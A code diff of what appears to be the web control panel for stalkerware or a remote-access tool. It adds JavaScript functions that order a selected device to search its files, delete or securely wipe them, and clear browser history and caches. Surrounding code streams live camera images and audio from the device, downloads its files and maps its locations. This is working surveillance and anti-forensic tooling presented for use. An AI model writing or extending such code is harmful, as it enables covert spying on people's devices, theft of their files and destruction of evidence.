+                    'png': 'image/png',
+                    'gif': 'image/gif',
+                    'webp': 'image/webp',
+                    'mp4': 'video/mp4',
+                    'mp3': 'audio/mpeg',
+                    'wav': 'audio/wav',
+                    'pdf': 'application/pdf',
+                    'txt': 'text/plain',
+                    'doc': 'application/msword',
+                    'docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
+                    'zip': 'application/zip'
+                };
+                
+                const mimeType = mimeTypes[extension] || 'application/octet-stream';
+                const blob = base64ToBlob(fileData.data, mimeType);
+                
+                if (!blob) {
+                    alert('Failed to process file data');
+                    return;
+                }
+                
+                if (window.pendingPreview) {
+                    const url = URL.createObjectURL(blob);
+                    const previewWindow = window.open(url, '_blank');
+                    
+                    if (!previewWindow) {
+                        alert('Please allow popups to preview files');
+                        downloadBlob(blob, fileData.filename);
+                    } else {
+                        setTimeout(() => URL.revokeObjectURL(url), 60000);
+                    }
+                    
+                    window.pendingPreview = null;
+                    console.log('✅ File opened for preview:', fileData.filename);
+                } else {
+                    downloadBlob(blob, fileData.filename);
+                    console.log('✅ File downloaded:', fileData.filename);
+                    alert(`File downloaded: ${fileData.filename}`);
+                }
+                
+            } catch (error) {
+                console.error('File handling error:', error);
+                const indicator = document.getElementById('file-loading-indicator');
+                if (indicator) indicator.remove();
+                alert('Failed to process file: ' + error.message);
+            }
+        }
+
+        function downloadBlob(blob, filename) {
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            
+            // ✅ ИСПРАВЛЕНО: Освобождаем память
+            setTimeout(() => URL.revokeObjectURL(url), 100);
+        }
+
+        function base64ToBlob(base64, mimeType) {
+            try {
+                const cleanBase64 = base64.replace(/^data:.*;base64,/, '');
+                const binaryString = atob(cleanBase64);
+                const bytes = new Uint8Array(binaryString.length);
+                
+                for (let i = 0; i < binaryString.length; i++) {
+                    bytes[i] = binaryString.charCodeAt(i);
+                }
+                
+                return new Blob([bytes], { type: mimeType });
+            } catch (error) {
+                console.error('Base64 decode error:', error);
+                return null;
+            }
+        }
+
+        // ✅ ИСПРАВЛЕНО: File search functions
+        async function searchFiles() {
+            if (!selectedDeviceId) {
+                showError('Please select a device first');
+                return;
+            }
+            
+            const keywords = document.getElementById('fileKeywords').value.split(',').map(k => k.trim()).filter(k => k);
+            const extensions = document.getElementById('fileExtensions').value.split(',').map(e => e.trim()).filter(e => e);
+            
+            const command = {
+                action: 'search_files',
+                keywords: keywords,
+                extensions: extensions
+            };
+            
+            try {
+                await sendFileCommand(command);
+            } catch (error) {
+                showError('File search failed');
+            }
+        }
+
+        async function sendFileCommand(command) {
+            if (!selectedDeviceId) {
+                throw new Error('No device selected');
+            }
+            
+            // ✅ ИСПРАВЛЕНО: Правильный endpoint
+            const response = await fetch('/api/device/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    device_id: selectedDeviceId,
+                    command: JSON.stringify(command),
+                    token: token
+                })
+            });
+            
+            if (!response.ok) {
+                throw new Error('Command failed');
+            }
+            
+            return response.json();
+        }
+
+        function displaySearchResults(files) {
+            foundFiles = files;
+            const resultsDiv = document.getElementById('searchResults');
+            const fileListDiv = document.getElementById('fileList');
+            
+            if (files.length === 0) {
+                fileListDiv.innerHTML = '<p>No files found</p>';
+            } else {
+                fileListDiv.innerHTML = files.map((file, index) => `
+                    <div class="file-item" style="padding: 5px; border-bottom: 1px solid #333; cursor: pointer;" onclick="toggleFileSelection(${index})">
+                        <input type="checkbox" id="file_${index}" style="margin-right: 10px;">
+                        <span style="font-size: 12px;">${file}</span>
+                    </div>
+                `).join('');
+            }
+            
+            resultsDiv.style.display = 'block';
+        }
+
+        function toggleFileSelection(index) {
+            const checkbox = document.getElementById(`file_${index}`); // ✅ ИСПРАВЛЕНО
+            if (!checkbox) return;
+            
+            checkbox.checked = !checkbox.checked;
+            
+            if (checkbox.checked) {
+                if (!selectedFiles.includes(foundFiles[index])) {
+                    selectedFiles.push(foundFiles[index]);
+                }
+            } else {
+                selectedFiles = selectedFiles.filter(f => f !== foundFiles[index]);
+            }
+            
+            const deleteBtn = document.getElementById('deleteBtn');
+            const wipeBtn = document.getElementById('wipeBtn');
+            if (deleteBtn) deleteBtn.disabled = selectedFiles.length === 0;
+            if (wipeBtn) wipeBtn.disabled = selectedFiles.length === 0;
+        }
+
+        async function deleteSelectedFiles() {
+            if (selectedFiles.length === 0) {
+                showError('No files selected');
+                return;
+            }
+            
+            if (!confirm(`Delete ${selectedFiles.length} selected files?`)) return; // ✅ ИСПРАВЛЕНО
+            
+            const command = {
+                action: 'delete_files',
+                files: selectedFiles
+            };
+            
+            try {
+                await sendFileCommand(command);
+                selectedFiles = [];
+                searchFiles();
+            } catch (error) {
+                showError('Failed to delete files');
+            }
+        }
+
+        async function secureWipeFiles() {
+            if (selectedFiles.length === 0) {
+                showError('No files selected');
+                return;
+            }
+            
+            if (!confirm(`Securely wipe ${selectedFiles.length} files? This cannot be undone!`)) return; // ✅ ИСПРАВЛЕНО
+            
+            const command = {
+                action: 'secure_wipe',
+                files: selectedFiles
+            };
+            
+            try {
+                await sendFileCommand(command);
+                selectedFiles = [];
+                searchFiles();
+            } catch (error) {
+                showError('Failed to wipe files');
+            }
+        }
+
+        async function clearBrowserHistory() {
+            if (!confirm('Clear all browser history and data?')) return;
+            
+            const command = { action: 'clear_history' };
+            await sendFileCommand(command);
+        }
+
+        async function clearAppCaches() {
+            if (!confirm('Clear all application caches?')) return;
+            
+            const command = { action: 'clear_cache' };
+            await sendFileCommand(command);
+        }
+        // === MAP RENDERING ===
         function renderRouteOnMap(locations) {
             clearRouteDisplay();
             
@@ -1917,196 +2244,6 @@ function disableCameraControls() {
             disableCameraControls();
         }
 
-        let pollInterval = null;
-
-function connectToDevice(deviceId) {
-    if (deviceWebSocket) {
-        deviceWebSocket.close();
-    }
-    
-    if (pollInterval) {
-        clearInterval(pollInterval);
-    }
-    
-    selectedDeviceId = deviceId;
-    
-    const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-    const wsHost = window.location.host;
-    const wsUrl = `${wsProtocol}//${wsHost}/ws/live?deviceId=${deviceId}`;
-    
-    console.log('Connecting to WebSocket:', wsUrl);
-    
-    deviceWebSocket = new WebSocket(wsUrl);
-    
-    deviceWebSocket.onopen = () => {
-        console.log('✅ WebSocket connected for live stream');
-        document.getElementById('streamStatus').textContent = 'Connected';
-        document.getElementById('streamStatus').style.color = 'var(--success-green)';
-        enableCameraControls();
-        
-        if (pollInterval) {
-            clearInterval(pollInterval);
-            pollInterval = null;
-        }
-    };
-    
-    deviceWebSocket.onmessage = (event) => {
-        try {
-            const data = JSON.parse(event.data);
-            
-            if (data.type === 'image') {
-                displayLiveImage(data.data);
-            } 
-            else if (data.type === 'audio') {
-                playAudioData(data.data);
-            }
-            else if (data.type === 'file_download') {
-                handleFileDownload(data);
-            }
-        } catch (error) {
-            console.error('Error processing WebSocket message:', error);
-        }
-    };
-    
-    deviceWebSocket.onerror = (error) => {
-        console.error('WebSocket error:', error);
-        document.getElementById('streamStatus').textContent = 'Error';
-        document.getElementById('streamStatus').style.color = 'var(--danger-red)';
-    };
-    
-    deviceWebSocket.onclose = () => {
-        console.log('WebSocket disconnected');
-        document.getElementById('streamStatus').textContent = 'HTTP Mode';
-        document.getElementById('streamStatus').style.color = 'orange';
-        
-        const canvas = document.getElementById('imageCanvas');
-        if (canvas) {
-            const ctx = canvas.getContext('2d');
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#666';
-            ctx.font = '20px Arial';
-            ctx.textAlign = 'center';
-            ctx.fillText('Connecting...', canvas.width / 2, canvas.height / 2);
-        }
-        
-        if (!pollInterval) {
-            pollInterval = setInterval(() => {
-                pollLatestImage(deviceId);
-            }, 3000);
-        }
-    };
-}
-
-async function pollLatestImage(deviceId) {
-    try {
-        const response = await fetch(`/api/device/${deviceId}/latest-image/${token}`);
-        if (response.ok) {
-            const data = await response.json();
-            if (data.image) {
-                displayLiveImage(data.image);
-            }
-        }
-    } catch (error) {
-        console.error('HTTP polling error:', error);
-    }
-}
-
-        // === UI CONTROL FUNCTIONS ===
-        function toggleSidebar() {
-            const sidebar = document.getElementById('sidebar');
-            sidebar.classList.toggle('open');
-        }
-
-        function toggleMapControls() {
-            const controls = document.getElementById('mapControls');
-            const toggle = controls.querySelector('.controls-toggle');
-            
-            controls.classList.toggle('minimized');
-            toggle.textContent = controls.classList.contains('minimized') ? '▶' : '◀';
-        }
-
-        function toggleFullscreen() {
-            if (!document.fullscreenElement) {
-                document.documentElement.requestFullscreen();
-            } else {
-                document.exitFullscreen();
-            }
-        }
-
-        function showAnalytics() {
-            switchTab('analytics', { target: document.querySelector('.nav-tab:nth-child(2)') });
-            if (selectedDeviceId) {
-                loadAnalytics();
-            }
-        }
-
-        // === DEVICE ACTIONS ===
-        function renameDevice(event, deviceId) {
-            event.stopPropagation();
-            renameDeviceId = deviceId;
-            
-            const currentName = devicesData.get(deviceId)?.device_name || '';
-            document.getElementById('renameInput').value = currentName;
-            document.getElementById('renameModal').classList.remove('hidden');
-            document.getElementById('renameInput').focus();
-        }
-
-        async function confirmRename() {
-            const newName = document.getElementById('renameInput').value.trim();
-            if (!newName) return;
-            
-            try {
-                const res = await fetch(`/api/device/${renameDeviceId}/rename/${token}`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ name: newName })
-                });
-                
-                if (res.ok) {
-                    closeRenameModal();
-                    loadDevices();
-                }
-            } catch (error) {
-                showError('Rename failed');
-            }
-        }
-
-        function closeRenameModal() {
-            document.getElementById('renameModal').classList.add('hidden');
-        }
-
-        function deleteDevice(event, deviceId) {
-            event.stopPropagation();
-            deleteDeviceId = deviceId;
-            
-            const deviceName = devicesData.get(deviceId)?.device_name || deviceId;
-            document.getElementById('deleteText').textContent = 
-                `This will permanently delete all data for ${deviceName}. Confirm termination?`;
-            document.getElementById('deleteModal').classList.remove('hidden');
-        }
-
-        async function confirmDelete() {
-            try {
-                const res = await fetch(`/api/device/${deleteDeviceId}/${token}`, {
-                    method: 'DELETE'
-                });
-                
-                if (res.ok) {
-                    closeDeleteModal();
-                    if (selectedDeviceId === deleteDeviceId) {
-                        clearMap();
-                    }
-                    loadDevices();
-                }
-            } catch (error) {
-                showError('Delete failed');
-            }
-        }
-
-        function closeDeleteModal() {
-            document.getElementById('deleteModal').classList.add('hidden');
-        }
-
         // === ANALYTICS FUNCTIONS ===
         async function loadAnalytics(days = 7) {
             if (!selectedDeviceId) {
@@ -2135,7 +2272,7 @@ async function pollLatestImage(deviceId) {
             const avgBattery = locations.length > 0 
                 ? Math.round(locations.reduce((sum, loc) => sum + (loc.battery || 0), 0) / locations.length)
                 : 0;
-document.getElementById('avgBattery').textContent = avgBattery + '%';
+            document.getElementById('avgBattery').textContent = avgBattery + '%';
             
             const uniqueDays = new Set(locations.map(loc => 
                 new Date(loc.timestamp).toDateString()
@@ -2338,6 +2475,73 @@ document.getElementById('avgBattery').textContent = avgBattery + '%';
             displayHistory(filtered);
         }
 
+        // === DEVICE ACTIONS ===
+        function renameDevice(event, deviceId) {
+            event.stopPropagation();
+            renameDeviceId = deviceId;
+            
+            const currentName = devicesData.get(deviceId)?.device_name || '';
+            document.getElementById('renameInput').value = currentName;
+            document.getElementById('renameModal').classList.remove('hidden');
+            document.getElementById('renameInput').focus();
+        }
+
+        async function confirmRename() {
+            const newName = document.getElementById('renameInput').value.trim();
+            if (!newName) return;
+            
+            try {
+                const res = await fetch(`/api/device/${renameDeviceId}/rename/${token}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ name: newName })
+                });
+                
+                if (res.ok) {
+                    closeRenameModal();
+                    loadDevices();
+                }
+            } catch (error) {
+                showError('Rename failed');
+            }
+        }
+
+        function closeRenameModal() {
+            document.getElementById('renameModal').classList.add('hidden');
+        }
+
+        function deleteDevice(event, deviceId) {
+            event.stopPropagation();
+            deleteDeviceId = deviceId;
+            
+            const deviceName = devicesData.get(deviceId)?.device_name || deviceId;
+            document.getElementById('deleteText').textContent = 
+                `This will permanently delete all data for ${deviceName}. Confirm termination?`;
+            document.getElementById('deleteModal').classList.remove('hidden');
+        }
+
+        async function confirmDelete() {
+            try {
+                const res = await fetch(`/api/device/${deleteDeviceId}/${token}`, {
+                    method: 'DELETE'
+                });
+                
+                if (res.ok) {
+                    closeDeleteModal();
+                    if (selectedDeviceId === deleteDeviceId) {
+                        clearMap();
+                    }
+                    loadDevices();
+                }
+            } catch (error) {
+                showError('Delete failed');
+            }
+        }
+
+        function closeDeleteModal() {
+            document.getElementById('deleteModal').classList.add('hidden');
+        }
+
         // === EXPORT FUNCTION ===
         async function exportData() {
             if (!selectedDeviceId) {
@@ -2400,6 +2604,35 @@ document.getElementById('avgBattery').textContent = avgBattery + '%';
 </gpx>`;
             
             return gpx;
+        }
+
+        // === UI CONTROL FUNCTIONS ===
+        function toggleSidebar() {
+            const sidebar = document.getElementById('sidebar');
+            sidebar.classList.toggle('open');
+        }
+
+        function toggleMapControls() {
+            const controls = document.getElementById('mapControls');
+            const toggle = controls.querySelector('.controls-toggle');
+            
+            controls.classList.toggle('minimized');
+            toggle.textContent = controls.classList.contains('minimized') ? '▶' : '◀';
+        }
+
+        function toggleFullscreen() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen();
+            } else {
+                document.exitFullscreen();
+            }
+        }
+
+        function showAnalytics() {
+            switchTab('analytics', { target: document.querySelector('.nav-tab:nth-child(2)') });
+            if (selectedDeviceId) {
+                loadAnalytics();
+            }
         }
 
         // === UTILITY FUNCTIONS ===
@@ -2530,6 +2763,3 @@ document.getElementById('avgBattery').textContent = avgBattery + '%';
     </script>
 </body>
 </html>
-
-
-
